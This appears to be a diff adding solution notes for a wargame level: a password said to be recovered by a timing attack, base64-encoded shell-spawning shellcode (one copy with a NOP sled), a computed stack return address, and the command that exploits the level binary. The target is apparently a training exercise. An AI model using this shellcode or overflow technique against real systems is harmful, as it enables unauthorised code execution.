@@ -1,0 +1,12 @@
+
+Timing attack, password is: Chann3lSideAttacksY
+
+export EXPLOIT=$(echo -n 'amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=' | base64 -d)
+
+Address:
+	0xbffffe2f + 8 = 0xbffffe37
+	$(printf '\xbf\xff\xfe\x20')
+
+# -- 
+export EXPLOIT=$(echo -n 'kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkGpoaC8vL3NoL2JpbonjaAEBAQGBNCRyaQEBMclRagRZAeFRieEx0moLWM2A' | base64 -d)
+/levels/level12 Chann3lSideAttacksY $(printf '\xbf\xff\xfe\x20')
